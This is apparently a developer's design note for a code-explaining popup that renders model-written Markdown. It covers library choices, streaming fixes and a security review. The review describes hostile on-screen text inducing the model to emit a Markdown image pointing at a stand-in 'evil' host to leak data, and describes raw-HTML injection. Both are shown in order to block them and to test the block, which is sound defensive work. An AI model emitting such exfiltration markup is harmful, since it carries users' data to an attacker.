# C1b — Make the answer readable

The popup worked but showed raw text. The model writes Markdown, so every answer arrived as a
wall of asterisks and hashes. C1 specified behaviour only; nothing owned what the popup looked
like.

## What the real answers contain

Measured across every saved answer in `evals/out/` — 993 lines, 38 KB of genuine model output.
Built against these, not against invented Markdown.

| | | | |
|---|---|---|---|
| `###` headings | 77 | fenced code blocks | 89 |
| `####` headings | 30 | — tagged `rust` | 41 |
| `**bold**` | 254 | — tagged `text` | 2 |
| inline `` `code` `` | 299 | — **untagged** | **46** |
| bullet items | 178 | `---` rules | 77 |
| blockquotes | 18 | numbered lists | 0 |

**Half the fences carry no language tag**, and many are rustc *output* rather than Rust source.
So: highlight Rust, leave everything else plain, and never guess at an untagged block.

## What shipped

`react-markdown` + `remark-gfm`, not `streamdown`. Streamdown is purpose-built for this, but it
ships Tailwind styling and this popup has hand-written CSS that has to stay in charge of a
translucent surface. Its block memoisation solves a problem 8 KB answers don't have.

`remend` standalone for the one part that did matter: closing unterminated `**bold`, `` `code ``
and fences mid-stream, so text doesn't flicker between interpretations as tokens land.

Shiki, lazy, JS regex engine, Rust + plaintext only. The default Shiki import pulls megabytes of
grammars; `highlight.js` registers ~190 languages at 307 KB gzip. Confirmed in the build output —
`core`, `engine-javascript`, `rust` and the theme are four separate chunks, none in the main
bundle.

Window grows to fit between 220 and 760 px, re-anchoring bottom-right after each resize.

## The security finding

The model transcribes whatever is on screen, so its output is untrusted input rendered into our
own webview. Two distinct risks:

**HTML injection** — closed almost for free. `react-markdown` does not render raw HTML unless you
add `rehype-raw`. The fix is to never install that plugin, and `skipHtml` drops the tags rather
than showing them.

**Exfiltration by image** — the one I had not considered. Even with HTML disabled, plain Markdown
`![x](https://evil/?leak=...)` still renders an `<img>`, and rendering it makes a request that
carries data out. No XSS required. Hostile text on screen could induce exactly that.

The mitigation costs nothing: this popup explains code, so it never needs a remote image or a
clickable link. `img` renders nothing, `a` renders as plain text. Refusing the capability beats
filtering destinations.

Also closed a pre-existing gap: `tauri.conf.json` had `"csp": null`, which Tauri documents as
applying no CSP at all — no backstop if sanitisation ever failed.

## Verification

`npm run check:inert` renders eleven hostile inputs through the real component and asserts on the
HTML. It is a regression test, not a demo — both properties it guards are one careless line away
from breaking.

```
PASS  no <img> / <script> / <iframe> / <a> element
PASS  no href, src, or on* attribute
PASS  no URL in any attribute
PASS  link text survives as words
PASS  entity-smuggled tag stays escaped
PASS  autolink URL is visible but inert

elements emitted: div, ol, li, span
```

**The failure path is proven, not assumed.** Reverting the `img`/`a` overrides makes six checks
fail and the script exit 1.

Two findings from writing it:

- **Asserting on raw HTML was necessary.** A first pass forbade the substring `src=` anywhere in
  the output and reported a false failure: case 7 feeds `&lt;img src=x&gt;`, which renders as
  escaped prose containing those characters while being completely inert. Only attributes inside
  real tags count. A screenshot cannot make that distinction — which is the whole argument for
  testing this way.
- **A URL rendered as visible text is fine.** GFM linkifies bare URLs, so `https://example.com/x`
  becomes a `<span>` with no `href`. It makes no request and cannot be clicked, and showing the
  reader what URL the model transcribed is desirable.

### The injection test was silently not running

Worth recording because it is the more instructive bug. The dev preview concatenated the saved
answer and the injection cases into one string. That answer was truncated at the token cap
**mid-code-fence**, so `remend` correctly closed the dangling fence at the very end — swallowing
the entire injection block into it. The cases rendered as syntax-highlighted code and the test
passed by never running.

Two fixes, because either alone would have left the trap set:

- the fixture generator now balances fences before writing, and
- the preview renders the answer and the probe as **two separate `<Answer>` instances**, so no
  amount of malformed Markdown in one can absorb the other.

## Still open

The prompt experiment (plan step 6). The saved answers show the model looping — one runs
"Option 7", "Option 8", "Option 9" with identical content until it hits the token cap. Much of
the 8 KB is repetition, which is a prompt problem rather than a rendering one.
